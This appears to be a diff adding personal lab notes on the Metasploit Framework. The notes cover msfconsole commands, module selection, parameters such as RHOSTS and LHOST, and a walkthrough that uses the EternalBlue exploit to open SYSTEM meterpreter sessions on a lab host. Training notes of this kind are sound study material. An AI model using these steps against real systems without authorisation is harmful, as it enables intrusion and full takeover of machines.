@@ -1,0 +1,192 @@
+The main components of the Metasploit Framework can be summarized as follows:
+
+    msfconsole: The main command-line interface.
+    Modules:    supporting modules such as exploits, scanners, payloads, etc.
+    Tools:      Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. 
+                Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module. 
+
+
+Metasploit console command:
+msfconsole
+
+
+
+Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit, and payload.
+
+    Exploit: A piece of code that uses a vulnerability present on the target system.
+    Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
+    Payload: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. 
+             Payloads are the code that will run on the target system.
+
+
+Example:
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+The command line prompt changes from msf6 to “msf6 exploit(windows/smb/ms17_010_eternalblue)”
+
+
+
+The show command can be used in any context followed by a module type (auxiliary, payload, exploit, etc.) to list available modules.
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   generic/custom                                               manual  No     Custom Payload
+   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
+   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
+   3   windows/x64/exec                                             manual  No     Windows x64 Execute Command
+   4   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path
+   5   windows/x64/messagebox                                       manual  No     Windows MessageBox x64
+
+
+
+
+
+You can leave the context using the back command.
+msf6 exploit(windows/smb/ms17_010_eternalblue) > back
+msf6 > 
+
+
+
+
+Search results to only include auxiliary modules, we could set the type to auxiliary.
+
+Matching Modules
+================
+
+   #   Name                                                Disclosure Date  Rank    Check  Description
+   -   ----                                                ---------------  ----    -----  -----------
+   0   auxiliary/admin/http/dlink_dir_300_600_exec_noauth  2013-02-04       normal  No     D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution
+   1   auxiliary/admin/http/netgear_r6700_pass_reset       2020-06-15       normal  Yes    Netgear R6700v3 Unauthenticated LAN Admin Password Reset
+   2   auxiliary/dos/cisco/ios_telnet_rocem                2017-03-17       normal  No     Cisco IOS Telnet Denial of Service
+   3   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof        2010-12-21       normal  No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
+   4   auxiliary/scanner/ssh/juniper_backdoor              2015-12-20       normal  No     Juniper SSH Backdoor Scanner
+
+Interact with a module by name or index, for example use 13 or use auxiliary/server/capture/telnet
+
+
+
+
+
+All parameters are set using the same command syntax:
+set PARAMETER_NAME VALUE
+
+EX:
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
+rhosts => 10.10.165.39
+
+
+
+
+
+Parameters you will often use are:
+
+    RHOSTS: “Remote host”, the IP address of the target system.
+    RPORT: “Remote port”, the port on the target system the vulnerable application is running on.
+    PAYLOAD: The payload you will use with the exploit.
+    LHOST: “Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.
+    LPORT: “Local port”, the port you will use for the reverse shell to connect back to.
+    SESSION: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.
+
+You can also clear any parameter value using the unset command or clear all set parameters with the unset all command.
+
+You can use the setg command to set values that will be used for all modules.
+The example below uses the following flow;
+
+    We use the ms17_010_eternalblue exploitable
+    We set the RHOSTS variable using the setg command instead of the set command
+    We use the back command to leave the exploit context
+    We use an auxiliary (this module is a scanner to discover MS17-010 vulnerabilities)
+    The show options command shows the RHOSTS parameter is already populated with the IP address of the target system.
+
+The setg command sets a global value that will be used until you exit Metasploit or clear it using the unsetg command.
+
+
+
+The exploit command can be used without any parameters or using the “-z” parameter.
+
+The exploit -z command will run the exploit and background the session as soon as it opens.
+
+
+
+
+
+You can use the background command to background the session prompt and go back to the msfconsole prompt.
+
+EX:
+meterpreter > background
+[*] Backgrounding session 2...
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+
+
+
+
+
+ Alternatively, CTRL+Z can be used to background sessions.
+
+The sessions command can be used from the msfconsole prompt or any context to see the existing sessions.
+
+EX:
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)
+
+
+
+To interact with any session, you can use the sessions -i command followed by the desired session number.
+msf6 > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)
+
+msf6 > sessions -i 2
+[*] Starting interaction with 2...
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
